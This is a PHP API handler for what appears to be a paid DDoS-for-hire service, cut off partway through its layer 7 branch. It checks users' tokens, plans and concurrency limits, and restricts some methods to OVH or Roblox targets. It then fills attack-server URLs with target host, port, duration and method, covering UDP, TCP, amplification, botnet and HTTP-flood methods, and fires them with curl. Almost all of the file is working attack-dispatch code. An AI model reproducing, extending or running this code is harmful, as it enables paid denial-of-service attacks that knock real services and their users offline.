<?php

require "../../backend/configuration/database.php";
require "../../backend/configuration/funcsinit.php";

if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

function ResponeSendApi(string $host, $port, $time, $method, $reqmethod, $reqs) {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(
        [
            "status" => "true",
            "message" => "Attack sent successfully x.x",
            "info" => [
                "host" => $host,
                "port" => $port,
                "method" => $method,
                "time" => $time
            ]
        ],
        JSON_PRETTY_PRINT
    );
}

function ResponeSend(string $sendkupa){
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode([
        "status" => "error",
        "message" => $sendkupa,
    ]);
}

function ResponeSendTrue(string $sendkupa){
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode([
        "status" => "true",
        "message" => $sendkupa,
    ]);
}

function ResponeSendrunningforapi(string $host,$port,$time,$method,$isp,$executionTime){
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(
        [
            "status" => "true",
            "message" => "Attack sent successfully x.x",
            "info" => [
                "host" => $host,
                "port" => $port,
                "method" => $method,
                "time" => $time,
                "host_isp" => $isp,
                "tts" => $executionTime
            ]
        ],
        JSON_PRETTY_PRINT
    );
}


function get_ip_address()
{
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }

    $ip = filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4);

    if (empty($ip)){
        return "127.0.0.1";
    }

    return $ip;
}



if (isset($_GET["token"])) {
    if (!empty($_GET["token"])) {
        $token = htmlentities($user->CheckInput($_GET["token"]));

        if ($user->SecureText($token)) {
            header("HTTP/1.0 400 Bad Request");
            return;
        }

        if ($token == "0") {
            $errors[] = "Invalid API Token.";
            ResponeSend("Invalid API authorization token");
            return;
        }

        $CheckToken = $odb->prepare("SELECT * FROM `users` WHERE `apitoken` = :token");
        $CheckToken->execute([":token" => $token]);
        $countuser = $CheckToken->rowCount();
        $userinfo = $CheckToken->fetch(PDO::FETCH_ASSOC);

        if ($countuser == 0) {
            $errors[] = "Invalid API Token.";
            ResponeSend("Invalid API authorization token");
            return;
        }

        $host = $_GET["host"];
        $time = intval($_GET["time"]);
        $port = intval($_GET["port"]);
        $method = $user->CheckInput($_GET["method"]);

        if ($user->SecureText($method)) {
            header("HTTP/1.0 400 Bad Request");
            return;
        }

        // if (isset($_GET["concs"])) {
        //     $concs = intval($_GET["concs"]);
        // } else {
        // }
        if (isset($_GET["reqs"])) {
            $reqs = $_GET["reqs"];
        } elseif (empty($_GET["reqs"])) {
            $reqs = "64";
        }
        if (isset($_GET["req_method"])) {
            $reqmethod = htmlentities($user->CheckInput($_GET["req_method"]));
        } elseif (empty($_GET["req_method"])) {
            $reqmethod = "GET";
        }
        if (isset($_GET["referrer"])) {
            $referrer = $_GET["referrer"];
        } elseif (empty($_GET["referrer"])) {
            $referrer = "0";
        }
        if (isset($_GET["cookies"])) {
            $cookies = htmlentities($_GET["cookies"]);
        } elseif (empty($_GET["cookies"])) {
            $cookies = "0";
        }
        if (isset($_GET["geoloc"])) {
            $geoloc = htmlentities($user->CheckInput($_GET["geoloc"]));
        } elseif (empty($_GET["geoloc"])) {
            $geoloc = "rand";
        }

        if (!empty($reqs)) {
            if (!is_numeric($reqs)) {
                $errors[] = "Invalid requests!";
                ResponeSend("Invalid requests value, required number format.");
                die();
            }
        }
        if (!empty($referrer)) {
            if (!filter_var($referrer, FILTER_VALIDATE_URL)) {
                $errors[] = "Invalid referrer!";
                ResponeSend("Invalid referrer format, required URL format!");
                die();
            }
        }

        if (!empty($geoloc)) {
            $locations = ["rand", "us", "eu", "ch", "au"];

            if (!in_array($geoloc, $locations)) {
                $errors[] = "Invalid geoloc value";
                ResponeSend("Invalid GeoLocation value.");
                die();
            }
        }

        //  if (empty($concs)) {
            $concs = "1";
        //  }

        if ($method != "stop" && $method != "stopall") {
            if ($userinfo["plan"] == "0") {
                $errors[] = "You do not have active paid membership.";
                ResponeSend("You do not have active paid membership.");
                die();
            }

            $CheckAPI = $odb->prepare("SELECT `plans`.`apiaccess` + `users`.`apiaccess` FROM `plans`,`users` WHERE `users`.`plan` = `plans`.`id` AND `users`.`apitoken` = :token");
            $CheckAPI->execute([":token" => $token]);
            $apiaccess = $CheckAPI->fetchColumn(0);

            if ($apiaccess == "0") {
                $errors[] = "You do not have access to use API.";
                ResponeSend("You do not have API access!");
                die();
            }

            $User = $odb->prepare("SELECT * FROM `users` WHERE `apitoken` = :apitoken");
            $User->execute([":apitoken" => $token]);
            $UserInfo = $User->fetch(PDO::FETCH_ASSOC);
            

            $Bans = $odb->prepare("SELECT * FROM `bans` WHERE `userid` = :userid");
            $Bans->execute([":userid" => $UserInfo['id']]);
            $checkBans = $Bans->fetchAll();

            if(count($checkBans) > 0) {
                ResponeSend("You are banned (reason: ".$checkBans[0]["reason"].")!");
                //Cfx_Send_Logs("Attack started - API Handler (Banned)","**Attack Info:** ```Host: $host\nPort: $port\nTime: $time\nMethod: $method```\n\n**User Info:** ```Username: " .$userinfo["username"] ."\nCon: $concs\nHandler: $handlers\nPremium: $premiummethod\nDate: $datee\nRequest IP: " .$_SERVER["HTTP_CF_CONNECTING_IP"]."\nToken: ".$token."```", "banned_attack");
                return;
            }

            $SQLMethod = $odb->prepare("SELECT COUNT(*) FROM `methods` WHERE `apiname` = :method AND `premium` = '1'");
            $SQLMethod->execute([":method" => $method]);
            $checkMethod = $SQLMethod->fetchColumn(0);

            if ($checkMethod == "1") {
                $CheckPremium = $odb->prepare("SELECT `plans`.`premium` + `users`.`premium` FROM `plans`,`users` WHERE `users`.`plan` = `plans`.`id` AND `users`.`apitoken` = :token");
                $CheckPremium->execute([":token" => $token]);
                $haspremium = $CheckPremium->fetchColumn(0);
                if ($haspremium == "0") {
                    $errors[] = "You do not have access to this method, please upgrade your plan!";
                    ResponeSend("You do not have access to this method, please upgrade your plan.");
                    die();
                }
            }

            $MethodDB = $odb->prepare("SELECT * FROM `methods` WHERE `apiname` = :method");
            $MethodDB->execute([":method" => $method]);
            $methodinfo = $MethodDB->fetch(PDO::FETCH_ASSOC);
            $countmethodd = $MethodDB->rowCount();
            if ($countmethodd == 0) {
                $errors[] = "Invalid method.";
                ResponeSend("Invalid method.");
                die();
            }
            $premiummethod = $methodinfo["premium"];
            $timelimit = $methodinfo["timelimit"];
            $methodtype = $methodinfo["type"];

            $layer4types = ["AMP", "UDP", "TCP","GAME","SPECIAL","BOTNET"];
            $layer7types = ["BASICL7", "PREMIUML7"];
            $freemethodtypes = ["FREEL4", "FREEL7"];

            if (in_array($methodtype, $freemethodtypes)) {
                $errors[] = "You do not have access to this method.";
                ResponeSend("You do not have access to this method.");
                return;
            }

            $Cooldown = $odb->prepare("SELECT *, (date - (UNIX_TIMESTAMP()-20)) as cooldown FROM `attacklogs` WHERE `date` > UNIX_TIMESTAMP()-20 AND `user` = :user LIMIT 1");
            $Cooldown->execute([":user" => $userinfo["username"]]);
            $lastAttacks = $Cooldown->rowCount();
            $lastAttack = $Cooldown->fetch(PDO::FETCH_ASSOC);


            // if ($userinfo["username"] == "gownokupa123") {
            //     ResponeSend("Please fill subnet required fields");
            //     return;
            // } else {
            //     //skip
            // }

            // if ($userinfo["username"] == "Seized1337") {
            //     continue;
            // } elseif ($lastAttacks > 0) {
            //     ResponeSend("Spam protection: You need wait ".$lastAttack['cooldown']." seconds to send your next attack.");
            //     return;
            // }
            

            //  LAYER 4  ///////////////////////////////////////////////

            if (in_array($methodtype, $layer4types)) {
                $UserInfoDB = $odb->prepare("SELECT * FROM `users` WHERE `id` = :id");
                $UserInfoDB->execute([":id" => $userinfo["id"]]);
                $user = $UserInfoDB->fetch(PDO::FETCH_ASSOC);
                $planid = $user["plan"];

                $Attacks = $odb->prepare("SELECT * FROM `attacklogs` WHERE `time` + `date` > UNIX_TIMESTAMP() AND `user` = :user AND `stopped` = 0");
                $Attacks->execute([":user" => $userinfo["username"]]);
                $runningattacks = $Attacks->rowCount();

                $PlanInfo = $odb->prepare("SELECT * FROM `plans` WHERE `id` = :planid");
                $PlanInfo->execute([":planid" => $planid]);

                $plan = $PlanInfo->fetch(PDO::FETCH_ASSOC);

                $Addons = $odb->prepare("SELECT `addon_concs`, `addon_time` FROM `users` WHERE `username` = :username");
                $Addons->execute([":username" => $userinfo["username"]]);

                $addon = $Addons->fetch(PDO::FETCH_ASSOC);

                $totalconcs = $plan["concs"] + $addon["addon_concs"];
                $totalattacktime = $plan["time"] + $addon["addon_time"];

                if (empty($host) ||empty($time) ||empty($port) ||empty($method) || $port < 0 || $port > 65500) {
                    $errors[] = "Please fill all required fields";
                    ResponeSend("Please fill all required fields.");
                    die();
                }
                if ($time < 30) {
                    $errors[] = "The minimum value for time is 30 seconds";
                    ResponeSend("The minimum value for time is 30 seconds.");
                    die();
                }
                if (!filter_var($host, FILTER_VALIDATE_IP)) {
                    $errors[] = "Invalid IP Address format!";
                    ResponeSend("Invalid IP Address format!");
                    die();
                }
                if (!filter_var($time, FILTER_SANITIZE_NUMBER_INT) || !filter_var($port, FILTER_SANITIZE_NUMBER_INT)) {
                    $errors[] = "Invalid port or time value!";
                    ResponeSend("Invalid port or time value!");
                    die();
                }

                if (!filter_var($concs, FILTER_SANITIZE_NUMBER_INT)) {
                    $errors[] = "Invalid concs value!";
                    ResponeSend("Invalid concs value!");
                    die();
                }

                if ($runningattacks + $concs > $totalconcs) {
                    $errors[] = "You can’t start as many attacks!";
                    ResponeSend("You cant start as many attacks!");
                    die();
                }

                if($userinfo["username"] == "Terminaluwu") {
                    if ($runningattacks + $concs > 1) {
                        ResponeSend("No available slots for your attack!");
                        return;
                    }
                }

                if($userinfo["username"] == "Seized1337") {
                    if ($runningattacks + $concs > 3) {
                        ResponeSend("No available slots for your attack!");
                        return;
                    }
                }

                if ($concs > $totalconcs) {
                    $errors[] = "You reached max number of concurrents";
                    ResponeSend("You reached max number of your plan concurrents!");
                    die();
                }

                if ($time > $totalattacktime) {
                    $errors[] = "Maximum time";
                    ResponeSend("Your maximum boot time is " .$totalattacktime ." seconds!");
                    die();
                }

                $SQLBlacklist = $odb->prepare("SELECT * FROM `blacklist` WHERE `target` LIKE :target");
                $SQLBlacklist->execute([":target" => "%{$host}%"]);

                $countBlacklist = $SQLBlacklist->rowCount();

                if ($countBlacklist > 0 && $user['rank'] != "Admin") {
                    //Cfx_Send_Logs("Attack started - API Handler (Blacklisted)","**Attack Info:** ```Host: $host\nPort: $port\nTime: $time\nMethod: $method```\n\n**User Info:** ```Username: " .$userinfo["username"] ."\nCon: $concs\nHandler: $handlers\nPremium: $premiummethod\nDate: $datee\nRequest IP: " .$_SERVER["HTTP_CF_CONNECTING_IP"]."\nToken: ".$token."```", "blacklisted_hosts");
                    $errors[] = "This target is blacklisted";
                    ResponeSend("This target is blacklisted!");
                    die();
                }

                $blacklistcurl = curl_init();
                curl_setopt($blacklistcurl,CURLOPT_URL,"http://77.91.78.48:3000/api/asn?ip=".$host);
                curl_setopt($blacklistcurl, CURLOPT_HEADER, 0);
                curl_setopt($blacklistcurl, CURLOPT_NOSIGNAL, 1);
                curl_setopt($blacklistcurl, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($blacklistcurl, CURLOPT_RETURNTRANSFER, 2);
                curl_setopt($blacklistcurl, CURLOPT_TIMEOUT, 3);
                $blacklistresp = curl_exec($blacklistcurl);
                curl_close($blacklistcurl);

                $restesting = json_decode($blacklistresp, true);

                $asn = $restesting["as"];
                $description = $restesting["description"];
                $isp = $restesting["isp"];
                $SQLBlacklistASN = $odb->prepare("SELECT * FROM `blacklist` WHERE `target` LIKE :target");
                $SQLBlacklistASN->execute([":target" => "%{$asn}%"]);

                $countBlacklistASN = $SQLBlacklistASN->rowCount();

                if ($countBlacklistASN > 0) {
                    $errors[] = "This ASN is blacklisted";
                    ResponeSend("This ASN is blacklisted!");
                    die();
                }

                //16276 OVH ASN
                if($method == 'OVHACK' && $asn != '16276'){
                    $errors[] = 'You can only attack OVH servers with this method!';
                    ResponeSend('You can only attack OVH servers with this method!');
                    return;
                }
                if($method == 'OVH-HEX' && $asn != '16276'){
                    $errors[] = "You can only attack OVH servers with this method!";
                    ResponeSend('You can only attack OVH servers with this method!');
                    return;  
                }

                if($description == "24SHELLS"){
                    $errors[] = "24 SHELLS is blacklisted!";
                    ResponeSend("24 SHELLS is blacklisted!");
                    return;
                }

                if($asn == '13335'){
                    $errors[] = "You cant hit cloudflare!";
                    ResponeSend("You cant hit cloudflare!");
                    return;
                }

                if($method == 'ROBLOX' && $asn != 'AS22697'){
                    ResponeSend("You can only attack ROBLOX servers with this method.");
                    die();
                }

                if($asn == 'AS13335 Cloudflare, Inc.'){
                    $errors[] = "You cant hit cloudflare!";
                    ResponeSend("You cant hit cloudflare!");
                    die();
                }

                if($method == 'TCPBOT' && $method == 'tcpbot'){
                    $errors[] = "You cant use botnet methods via API!";
                    ResponeSend("You cant use botnet methods via API!");
                    die();
                }
                if($method == 'tcpbot'){
                    $errors[] = "You cant use botnet methods via API!";
                    ResponeSend("You cant use botnet methods via API!");
                    die();
                }
                if($method == 'udpbot'){
                    $errors[] = "You cant use botnet methods via API!";
                    ResponeSend("You cant use botnet methods via API!");
                    die();
                }
                if($method == 'UDPBOT'){
                    $errors[] = "You cant use botnet methods via API!";
                    ResponeSend("You cant use botnet methods via API!");
                    die();
                }

                if($layer4types == "BOTNET"){
                    $errors[] = "You cant use botnet methods via API!";
                    ResponeSend("You cant use botnet methods via API!");
                    die();
                }

                // if($method == 'DISCORD' && $asn != 'AS49544'){
                //     $errors[] = "You can only attack DISCORD servers with this method.";
                //     ResponeSend("You can only attack DISCORD servers with this method.");
                //     die();
                // }

                //time limit
                // if($time > "1500"){
                //     $errors[] = "Server Error! Please contanct support #1";
                //     ResponeSend("Server Error! Please contanct support #1");
                //     die();
                // }

                // $currentTime = time();
                // $SpamProtection = $odb->prepare("SELECT COUNT(*) FROM `attacklogs` WHERE `time` + `date` > :currentTime AND `target` = :target");
                // $SpamProtection->bindParam(':currentTime', $currentTime, PDO::PARAM_INT);
                // $SpamProtection->bindParam(':target', $host, PDO::PARAM_STR);
                // $SpamProtection->execute();

                // $attackCount = $SpamProtection->fetchColumn();

                // if ($attackCount > 0) {
                //     ResponeSend("This host is currently under attack!");
                //     return;
                // }

                $SpamProtection = $odb->prepare("SELECT * FROM `attacklogs` WHERE `time` + `date` > UNIX_TIMESTAMP() AND `target` = :target");
                $SpamProtection -> execute(array(':target' => $host));
                $SpamProtection = $SpamProtection->rowCount();

                if ($userinfo["username"] == "gownokupa123") {
                    if($SpamProtection > 0) {
                        ResponeSend("This host is currently under attack!");
                        return;
                    }
                } else {
                    //skip
                }

                // $xxxxxxxxxxxx = (array("188.147.109.34"));
                // if(!in_array(strval($_SERVER["HTTP_CF_CONNECTING_IP"]), $xxxxxxxxxxxx)) {
                //     ResponeSend("API Maintenance (ETA: 10min connecting new servers)");
                //     die();
                // }

                if ($timelimit != 0 && $time > $timelimit) {
                    $errors[] ="Only users with Free Plan can use this method!";
                    echo json_encode(["status" => "error","message" =>"This method is limited on " .$timelimit ." seconds.",]);
                    die();
                } elseif ( $timelimit == 0 || ($timelimit != 0 && $time <= $timelimit)) {
                    if (empty($errors)) {
                        $sokin_start = microtime(true);
                        $atck = 0;

                        $SQLSelectServer = $odb->prepare("SELECT * FROM `servers` WHERE `id` > 0 AND `status` = 'online' AND `methods` LIKE :method ORDER BY RAND()");
                        $SQLSelectServer->execute([":method" => "%{$method}%"]);

                        while ($server = $SQLSelectServer->fetch(PDO::FETCH_ASSOC)) {
                            if ($atck > 0) {
                                break;
                            }
                            $name = $server["name"];

                            $LogsDB = $odb->prepare("SELECT * FROM `attacklogs` WHERE `servers` LIKE :name AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
                            $LogsDB->execute([":name" => "%{$name}%"]);

                            $countslots = $LogsDB->rowCount();

                            if ($countslots >= $server["slots"]) {
                                continue;
                            } elseif ($concs >= $server["slots"]) {
                                continue;
                            } elseif ($countslots + $concs > $server["slots"]) {
                                continue;
                            }
                            $atck++;

                            if ($time > 600) {
                                $newtime = 600;
                            } else {
                                $newtime = $time;
                            }
                            $FindInApi = ["[host]","[port]","[time]","[method]",];
                            $ApiReplace = [$host, $port, $newtime, $method];
                            $API = $server["apiurl"];

                            $handler[] = $server["name"];

                            $APIReplaced = str_replace($FindInApi,$ApiReplace,$API);

                            $handlers = @implode(",", $handler);

                            for ($x = 1; $x <= $concs; $x++) {
                                $datee = date("Y-m-d H:i:s");
                                $InsertLogs = $odb->prepare("INSERT INTO `attacklogs` (`id`, `user`, `target`, `port`, `time`, `method`, `concs`, `stopped`, `servers`, `premium`, `apiattack`, `date`, `enddate`, `datetime`) VALUES (NULL, :user, :target, :port, :time, :method, :concs, '0', :handler, :premium, '1', UNIX_TIMESTAMP(NOW()), :enddate, :datetime)");

                                $InsertLogs->execute([
                                    ":user" => $userinfo["username"],
                                    ":target" => $host,
                                    ":port" => $port,
                                    ":time" => $time,
                                    ":method" => $method,
                                    ":concs" => $concs,
                                    ":handler" => $handlers,
                                    ":premium" => $premiummethod,
                                    ":enddate" => $time + time(),
                                    ":datetime" => $datee,
                                ]);

                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $APIReplaced);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 2);
                                curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                                $result = curl_exec($ch);
                                curl_close($ch);

                                if (!$result) {
                                    $errors[] ="There is problem with Servers, please contact administrator!";
                                    ResponeSend("There is problem with Servers, please contact administrator!");
                                    die();
                                }
                            }
                        }
                        if ($atck == 0) {
                            $errors[] = "No available slots!";
                            ResponeSend("No available slots for your attack!");
                            die();
                        }
                        //Cfx_Send_Logs("Attack started - API Handler (L4)","`".$result."`\n\n**Attack Info:** ```Host: $host\nPort: $port\nTime: $time\nMethod: $method```\n\n**User Info:** ```Username: " .$userinfo["username"] ."\nCon: $concs\nHandler: $handlers\nPremium: $premiummethod\nDate: $datee\nRequest IP: " .$_SERVER["HTTP_CF_CONNECTING_IP"] ."\nToken: ".$token."```", "l4_api");
                        $sokin_end = microtime(true);
                        $executionTime = round(($sokin_end - $sokin_start) * 1000, 2);
                        ResponeSendrunningforapi($host,$port,$time,$method,$isp,$executionTime);
                        die();
                    }
                }
                //  LAYER 7  ////////////////////////////////////////////////
            } elseif (in_array($methodtype, $layer7types)) {
                $port = 443;
                $UserInfoDB = $odb->prepare("SELECT * FROM `users` WHERE `id` = :id");
                $UserInfoDB->execute([":id" => $userinfo["id"]]);
                $user = $UserInfoDB->fetch(PDO::FETCH_ASSOC);
                $planid = $user["plan"];

                $Attacks = $odb->prepare("SELECT * FROM `attacklogs` WHERE `time` + `date` > UNIX_TIMESTAMP() AND `user` = :user AND `stopped` = 0");
                $Attacks->execute([":user" => $userinfo["username"]]);
                $runningattacks = $Attacks->rowCount();

                $PlanInfo = $odb->prepare("SELECT * FROM `plans` WHERE `id` = :planid");
                $PlanInfo->execute([":planid" => $planid]);

                $plan = $PlanInfo->fetch(PDO::FETCH_ASSOC);

                $Addons = $odb->prepare("SELECT `addon_concs`, `addon_time` FROM `users` WHERE `username` = :username");
                $Addons->execute([":username" => $userinfo["username"]]);

                $addon = $Addons->fetch(PDO::FETCH_ASSOC);

                $totalconcs = $plan["concs"] + $addon["addon_concs"];
                $totalattacktime = $plan["time"] + $addon["addon_time"];

                if (empty($host) ||empty($time) || empty($method) || $port != 443) {
                    $errors[] = "Please fill all required fields";
                    ResponeSend("Please fill all required fields.");
                    die();
                }
                if ($reqs > 64) {
                    $errors[] = "Invalid requets per ip value!";
                    ResponeSend("Invalid Requests per IP value!");
                    die();
                }
                if ($time < 30) {
                    $errors[] = "The minimum value for time is 30 seconds";
                    ResponeSend("The minimum value for time is 30 seconds");
                    die();
                }
                if (!filter_var($host, FILTER_VALIDATE_URL)) {
                    $errors[] = "Invalid URL format!";
                    ResponeSend("Invalid URL format!");
                    die();
                }

                $requestmethods = ["GET", "POST", "HEAD"];
                if (!in_array($reqmethod, $requestmethods)) {
                    $errors[] = "Invalid request method value!";
                    ResponeSend("Invalid request method value!");
                    die();
                }
                if (!filter_var($time, FILTER_SANITIZE_NUMBER_INT) ||!filter_var($concs, FILTER_SANITIZE_NUMBER_INT)) {
                    $errors[] = "Invalid port or time value!";
                    ResponeSend("Invalid port or time value!");
                    die();
                }
                if(($runningattacks + $concs) > $totalconcs){
                    $errors[] = "You cant start as many attacks!";
                    ResponeSend("You cant start as many attacks!");
                    die();
                }
                // if ($runningattacks + $concs > $plan["concs"]) {
                //     $errors[] = "You cant start as many attacks!";
                //     ResponeSend("You cant start as many attacks!");
                //     die();
                // }

                if ($concs > $totalconcs) {
                    $errors[] = "You reached max number of concurrents";
                    ResponeSend("You reached max number of your plan concurrents!");
                    die();
                }

                if ($time > $totalattacktime) {
                    $errors[] = "Maximum time";
                    ResponeSend("Your maximum boot time is ".$totalattacktime." seconds!");
                    die();
                }

                // if($method == "HTTPS-BYPASS"){
                //     $errors[] = "HTTPS-BYPASS are not allowed to use via API.";
                //     ResponeSend("HTTPS-BYPASS are not allowed to use via API.");
                //     die();
                // }

                if($time > "700"){
                    $errors[] = "Server Error! Please contanct support #1";
                    ResponeSend("Server Error! Please contanct support #1");
                    die();
                }

                // $xxxxxxxxxxxx = (array("188.147.109.34"));
                // if(!in_array(strval($_SERVER["HTTP_CF_CONNECTING_IP"]), $xxxxxxxxxxxx)) {
                //     ResponeSend("API Maintenance (ETA: 10min connecting new servers)");
                //     die();
                // }


                $SpamProtection = $odb->prepare("SELECT * FROM `attacklogs` WHERE `time` + `date` > UNIX_TIMESTAMP() AND `target` = :target");
                $SpamProtection -> execute(array(':target' => $host));
                $SpamProtection = $SpamProtection->rowCount();

                if ($userinfo["username"] == "gownokupa123") {
                    if($SpamProtection > 0) {
                        ResponeSend("This host is currently under attack!");
                        return;
                    }
                } else {
                    //skip
                }
                
                // $SpamProtection = $odb->prepare("SELECT * FROM `attacklogs` WHERE `time` + `date` > UNIX_TIMESTAMP() AND `target` = :target");
                // $SpamProtection -> execute(array(':target' => $host));
                // $SpamProtection = $SpamProtection->rowCount();
                // if($SpamProtection > 0) {
                //     ResponeSend("This host is currently under attack!");
                //     return;
                // }

                function cfx_CheckWords($tekst, $slowaSprawdzane)
                {
                    foreach ($slowaSprawdzane as $slowo) {
                        $escapedSlowo = preg_quote($slowo, '/');
                        $pattern = '/\b' . str_replace('/', '\/', $escapedSlowo) . '\b/i';
                        if (preg_match($pattern, $tekst)) {
                            return true;
                        }
                    }
                    return false;
                }
                
                $slowaSprawdzane = array(
                    "police",
                    "polizei",
                    "gov",
                    "policja",
                    "gov.pl",
                    "government",
                    "government.ru",
                    "polisen",
                    "polisen.se",
                    "interpol",
                    "interpol.int",
                    "cfxsecurity.ru",
                    "cfxsecurity",
                    "islamabadpolice.gov.pk",
                    "poliisi"
                );

                $SQLBlacklist = $odb->prepare("SELECT * FROM `blacklist` WHERE `target` LIKE :target");
                $SQLBlacklist->execute([":target" => "%{$host}%"]);

                $countBlacklist = $SQLBlacklist->rowCount();

                if ($countBlacklist > 0 && $user['rank'] != "Admin") {
                    //Cfx_Send_Logs("Attack started - API Handler (Blacklisted)","**Attack Info:** ```Host: $host\nPort: $port\nTime: $time\nMethod: $method```\n\n**User Info:** ```Username: " .$userinfo["username"] ."\nCon: $concs\nHandler: $handlers\nPremium: $premiummethod\nDate: $datee\nRequest IP: " .$_SERVER["HTTP_CF_CONNECTING_IP"]."\nToken: ".$token."```", "blacklisted_hosts");
                    $errors[] = "This target is blacklisted";
                    ResponeSend("This target is blacklisted!");
                    die();
                }

                $BLUrl = $odb->prepare("SELECT * FROM `blacklist` WHERE `type` = 'URL'");
                $BLUrl->execute();

                $urlarrs = [];
                while ($url = $BLUrl->fetch(PDO::FETCH_ASSOC)) {
                    $urlarrs[] = $url["target"];
                }

                foreach ($urlarrs as $urlarr) {
                    if (strpos($host, $urlarr)) {
                        //Cfx_Send_Logs("Attack started - API Handler (Blacklisted)","**Attack Info:** ```Host: $host\nPort: $port\nTime: $time\nMethod: $method```\n\n**User Info:** ```Username: " .$userinfo["username"] ."\nCon: $concs\nHandler: $handlers\nPremium: $premiummethod\nDate: $datee\nRequest IP: " .$_SERVER["HTTP_CF_CONNECTING_IP"]."\nToken: ".$token."```", "blacklisted_hosts");
                        $errors[] = "This website is blacklisted";
                        ResponeSend("This website is blacklisted!");
                        die();
                    }
                }

                $BLDomain = $odb->prepare("SELECT * FROM `blacklist` WHERE `type` = 'DOMAIN'");
                $BLDomain->execute();

                $parameters = [];
                while ($domain = $BLDomain->fetch(PDO::FETCH_ASSOC)) {
                    $parameters[] = $domain["target"];
                }

                foreach ($parameters as $parameter) {
                    if (strpos($host, $parameter)) {
                        //Cfx_Send_Logs("Attack started - API Handler (Blacklisted)","**Attack Info:** ```Host: $host\nPort: $port\nTime: $time\nMethod: $method```\n\n**User Info:** ```Username: " .$userinfo["username"] ."\nCon: $concs\nHandler: $handlers\nPremium: $premiummethod\nDate: $datee\nRequest IP: " .$_SERVER["HTTP_CF_CONNECTING_IP"]."\nToken: ".$token."```", "blacklisted_hosts");
                        $errors[] = "This domain is blacklisted";
                        ResponeSend("This domain is blacklisted!");
                        die();
                    }
                }

                if (cfx_CheckWords($host, $slowaSprawdzane)) {
                    $cfx_date = date("Y-m-d H:i:s");
                    ResponeSend("Your Account has been banned for breaking tos (gov | police | cfxsecurity).");
                    //Cfx_Send_Logs("Attack started - API Handler (Ban Idiote)","**Attack Info:** ```Host: $host\nPort: $port\nTime: $time\nMethod: $method```\n\n**User Info:** ```Username: " .$userinfo["username"] ."\nCon: $concs\nPremium: $premiummethod\nDate: $cfx_date\nRequest IP: " .$_SERVER["HTTP_CF_CONNECTING_IP"]."\nToken: ".$token."```", "ban_idiote");
                    die();
                }

                if ($timelimit != 0 && $time > $timelimit) {
                    $errors[] = "This method is limited on " .$timelimit ." seconds!";
                    ResponeSend("This method is limited on " .$timelimit ." seconds!");
                    die();
                } elseif ($timelimit == 0 || ($timelimit != 0 && $time <= $timelimit)) {
                    if (empty($errors)) {
                        $atck = 0;

                        $SQLSelectServer = $odb->prepare(
                            "SELECT * FROM `servers` WHERE `id` > 0 AND `status` = 'online' AND `methods` LIKE :method ORDER BY RAND()"
                        );
                        $SQLSelectServer->execute([":method" => "%{$method}%"]);

                        while (
                            $server = $SQLSelectServer->fetch(PDO::FETCH_ASSOC)
                        ) {
                            if ($atck > 0) {
                                break;
                            }
                            $name = $server["name"];

                            $LogsDB = $odb->prepare("SELECT * FROM `attacklogs` WHERE `servers` LIKE :name AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
                            $LogsDB->execute([":name" => "%{$name}%"]);

                            $countslots = $LogsDB->rowCount();

                            if ($countslots >= $server["slots"]) {
                                continue;
                            } elseif ($concs >= $server["slots"]) {
                                continue;
                            } elseif ($countslots + $concs > $server["slots"]) {
                                continue;
                            }
                            $atck++;

                            $FindInApi = ["[host]","[port]","[time]","[method]","[reqmethod]","[reqs]","[referrer]","[cookies]","[geo]",];
                            $ApiReplace = [
                                $host,
                                $port,
                                $time,
                                $method,
                                $reqmethod,
                                $reqs,
                                $referrer,
                                $cookies,
                                $geoloc,
                            ];
                            $API = $server["apiurl"];

                            $handler[] = $server["name"];

                            $APIReplaced = str_replace(
                                $FindInApi,
                                $ApiReplace,
                                $API
                            );

                            $handlers = @implode(",", $handler);

                            for ($x = 1; $x <= $concs; $x++) {
                                $datee = date("Y-m-d H:i:s");
                                $InsertLogs = $odb->prepare("INSERT INTO `attacklogs`(`id`, `user`, `target`, `port`, `time`, `method`, `concs`, `stopped`, `servers`, `premium`, `apiattack`, `date`, `enddate`, `datetime`) VALUES (NULL, :user, :target, :port, :time, :method, :concs, '0', :handler, :premium, '1', UNIX_TIMESTAMP(NOW()), :enddate, :datetime)");

                                $InsertLogs->execute([
                                    ":user" => $userinfo["username"],
                                    ":target" => $host,
                                    ":port" => $port,
                                    ":time" => $time,
                                    ":method" => $method,
                                    ":concs" => $concs,
                                    ":handler" => $handlers,
                                    ":premium" => $premiummethod,
                                    ":enddate" => $time + time(),
                                    ":datetime" => $datee,
                                ]);
                                // echo $methodupdated;
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $APIReplaced);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 2);
                                curl_setopt($ch, CURLOPT_TIMEOUT, 10);
                                $result = curl_exec($ch);
                                curl_close($ch);

                                //echo $result;
                                //echo $APIReplaced;

                                // if (!$result) {
                                //     $errors[] ="There is problem with Servers, please contact administrator!";
                                //     ResponeSend("There is problem with Servers, please contact administrator!");
                                //     die();
                                // }
                            }
                        }
                        if ($atck == 0) {
                            $errors[] = "No available slots for your attack!";
                            ResponeSend("No available slots for your attack!");
                            die();
                        }
